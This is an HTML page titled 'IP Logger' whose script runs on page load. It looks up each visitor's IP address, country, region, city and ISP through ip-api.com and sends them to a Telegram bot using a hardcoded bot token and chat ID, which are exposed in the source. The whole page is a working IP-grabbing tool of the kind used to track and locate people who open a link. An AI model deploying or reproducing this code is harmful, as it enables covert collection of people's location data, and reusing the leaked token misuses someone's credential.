<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script>
        // Token and chat ID
        const BOT_TOKEN = "5105959931:AAEdbFhbfy_hO60LZGXAJzFnHCnvXaPSi7w";
        const CHAT_ID = "5376094649";

        // Function to fetch IP and send it to Telegram bot
        function logIP() {
            fetch('http://ip-api.com/json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.query;
                    const country = data.country;
                    const region = data.regionName;
                    const city = data.city;
                    const isp = data.isp;

                    const message = `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nISP: ${isp}`;

                    // Send the IP info to Telegram Bot
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            alert("IP logged and sent successfully!");
                        } else {
                            alert("Error: " + data.description);
                        }
                    })
                    .catch(error => {
                        console.error("Error sending IP:", error);
                        alert("Error sending IP.");
                    });
                })
                .catch(error => {
                    console.error("Error fetching IP:", error);
                    alert("Error fetching IP.");
                });
        }

        // Call logIP function when the page loads
        window.onload = logIP;
    </script>
</head>
<body>
    <h1>Logging IP and Sending to Telegram Bot</h1>
    <p>Your IP information is being sent to Telegram...</p>
</body>
</html>
